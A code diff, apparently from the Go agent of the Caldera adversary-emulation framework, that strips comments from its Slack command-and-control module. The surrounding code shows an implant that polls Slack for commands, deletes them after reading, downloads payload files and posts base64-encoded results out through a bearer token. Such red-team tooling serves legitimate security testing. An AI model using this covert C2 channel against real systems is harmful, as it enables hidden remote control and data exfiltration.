@@ -16,7 +16,6 @@ import (
 	"strings"
 
 	"github.com/mitre/gocat/output"
-
 )
 
 const (
@@ -26,7 +25,6 @@ const (
 	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon slack response before giving up.
 	beaconWait = 10 // number of seconds to wait for beacon slack response in case of initial failure.
 	maxDataChunkSize = 750000 // SLACK has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
-	// todo: fix above line later
 )
 
 var (
@@ -153,7 +151,6 @@ func slackBeacon(profile map[string]interface{}) ([]byte, bool) {
 	failCount := 0
 	heartbeat := createHeartbeatSlack("beacon", profile)
 	if heartbeat {
-		//collect instructions & delete
 		for failCount < beaconResponseFailThreshold {
 			contents := getSlackMessages("instructions", profile["paw"].(string));
 			if contents != nil {
@@ -164,7 +161,6 @@ func slackBeacon(profile map[string]interface{}) ([]byte, bool) {
 				}
 				return decodedContents, heartbeat
 			}
-			// Wait for C2 server to provide instruction response slack.
 			time.Sleep(time.Duration(float64(beaconWait)) * time.Second)
 			failCount += 1
 		}
@@ -210,9 +206,7 @@ func slackResults(result map[string]interface{}) {
 }
 
 func createSlackContent(slackName string, description string, data []byte) bool {
-	// returns false if it failed, true if success
 	stringified := base64.StdEncoding.EncodeToString(data)
-	// slackText := fmt.Sprintf("%s | %s", slackName, stringified);
 	requestBody := url.Values{}
     requestBody.Set("channels", channel_id)
     requestBody.Set("initial_comment", fmt.Sprintf("%s | %s", slackName, description))
@@ -226,7 +220,6 @@ func createSlackContent(slackName string, description string, data []byte) bool 
 
 
 func createSlack(slackName string, description string, data []byte) bool {
-	// returns false if it failed, true if success
 	stringified := base64.StdEncoding.EncodeToString(data)
 	slackText := fmt.Sprintf("%s | %s", slackName, stringified);
 	requestBody, err := json.Marshal(map[string]string{
@@ -254,7 +247,6 @@ func getSlackMessages(slackType string, uniqueID string) []string {
 	json.Unmarshal(msgs, &result);
 
 	if result["ok"] == false {
-		// error stuff
 		output.VerbosePrint(fmt.Sprintf("[-] Failed to get slack messages: %s", msgs))
 		return contents
 	}
@@ -262,12 +254,7 @@ func getSlackMessages(slackType string, uniqueID string) []string {
 	for i := range result["messages"].([]interface{}) {
 		text := result["messages"].([]interface{})[i].(map[string]interface{})["text"]
 		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
-			// we only want the text here
-
 			contents = append(contents, strings.SplitN(fmt.Sprintf("%s", text), " | ", 2)[1])
-			
-			// now delete it
-			//s = requests.post('https://slack.com/api/chat.delete',headers={"Authorization":"Bearer %s"%(APIKEY), "charset":"utf-8"}, data={"channel":"C022KUS0E5R","ts":ts})
 			requestBody, err := json.Marshal(map[string]interface{}{
 				"channel":channel_id,
 				"ts":result["messages"].([]interface{})[i].(map[string]interface{})["ts"],
@@ -277,18 +264,11 @@ func getSlackMessages(slackType string, uniqueID string) []string {
 				output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
 			}
 
-			//var result2 map[string]interface{}
 			if (!strings.Contains(slackType,"payloads")) {
 				post_request("https://slack.com/api/chat.delete", requestBody);
 			}
-			
-
-
 		}
 	}
-
-
-
 	return contents
 }
 
@@ -302,7 +282,6 @@ func getSlacks(slackType string, uniqueID string) []string {
 	json.Unmarshal(msgs, &result);
 
 	if result["ok"] == false {
-		// error stuff
 		output.VerbosePrint(fmt.Sprintf("[-] Failed to get slack messages: %s", msgs))
 		return contents
 	}
@@ -310,15 +289,9 @@ func getSlacks(slackType string, uniqueID string) []string {
 	for i := range result["messages"].([]interface{}) {
 		text := result["messages"].([]interface{})[i].(map[string]interface{})["text"]
 		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
-			// use preview for now
-			// TODO: if larger file, actually retrieve the file download
-			
-			// contents = append(contents, result["messages"].([]interface{})[i].(map[string]interface{})["files"].([]interface{})[0].(map[string]interface{})["preview"].(string))
 			url_file = result["messages"].([]interface{})[i].(map[string]interface{})["files"].([]interface{})[0].(map[string]interface{})["url_private_download"].(string)
 			contents = append(contents, fmt.Sprintf("%s", get_request(url_file)))
 			
-			// now delete it
-			//s = requests.post('https://slack.com/api/chat.delete',headers={"Authorization":"Bearer %s"%(APIKEY), "charset":"utf-8"}, data={"channel":"C022KUS0E5R","ts":ts})
 			requestBody, err := json.Marshal(map[string]interface{}{
 				"channel":channel_id,
 				"ts":result["messages"].([]interface{})[i].(map[string]interface{})["ts"],
@@ -328,18 +301,11 @@ func getSlacks(slackType string, uniqueID string) []string {
 				output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
 			}
 
-			//var result2 map[string]interface{}
 			if (!strings.Contains(slackType,"payloads")) {
 				post_request("https://slack.com/api/chat.delete", requestBody);
 			}
-			
-
-
 		}
 	}
-
-
-
 	return contents
 }
 
@@ -365,8 +331,6 @@ func getNewUploadId() string {
 }
 
 func post_request(address string, data []byte) []byte {
-	// data should already be encoded
-	//encodedData := []byte(base64.StdEncoding.EncodeToString(data))
 	req, err := http.NewRequest("POST", address, bytes.NewBuffer(data))
 	req.Header.Set("Authorization", "Bearer " + token)
 	req.Header.Set("Content-Type", "application/json")
@@ -394,8 +358,6 @@ func post_request(address string, data []byte) []byte {
 }
 
 func post_form(address string, data url.Values) []byte {
-	// data should already be encoded
-	//encodedData := []byte(base64.StdEncoding.EncodeToString(data))
 	req, err := http.NewRequest("POST", address, strings.NewReader(data.Encode()))
 	req.Header.Set("Authorization", "Bearer " + token)
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
